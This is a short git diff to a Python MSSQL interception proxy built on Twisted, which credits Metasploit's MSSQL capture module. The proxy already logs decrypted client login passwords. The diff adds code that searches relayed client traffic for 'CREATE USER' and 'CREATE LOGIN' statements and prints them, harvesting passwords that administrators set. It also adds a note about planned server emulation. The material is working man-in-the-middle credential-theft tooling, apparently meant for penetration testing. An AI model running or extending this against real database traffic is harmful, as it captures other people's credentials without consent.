@@ -11,6 +11,7 @@
 #   https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/server/capture/mssql.rb
 #
 # do zrobienia:
+# - emulacja serwera
 # - wlasna fabryka do wspoldzielenia danych - https://stackoverflow.com/questions/14848793/passing-parameters-to-twisted-factory-to-be-passed-to-session
 
 TDS_RESPONSE          = 4
@@ -154,6 +155,15 @@ class MSSQLServerProtocol(protocol.Protocol):
         LOG.warning("Password: %s%s%s",RED,self.decryptPassword(self.getLoginFieldB(login,"Password")).decode('utf-8'),END)
         LOG.warning("")
 
+    def findSQLString(self,data,sql):
+        i = data.lower().find(sql.encode('utf-16le').lower())
+        if i > -1:
+            LOG.warning("%s%s%s",RED,data[i:].decode('utf-16le'),END) 
+
+    def findSQLPasswords(self,data):
+        self.findSQLString(data,"CREATE USER")
+        self.findSQLString(data,"CREATE LOGIN")
+
     # Client => Proxy
     def dataReceived(self, data):
         if self.tls_enabled:
@@ -197,6 +207,9 @@ class MSSQLServerProtocol(protocol.Protocol):
             else:
                 prelogin.setEncryptionOption(tds.TDS_ENCRYPT_REQ)
                 data=prelogin.data
+
+        self.findSQLPasswords(data)
+
         if self.client:
             self.client.write(data)
         else:
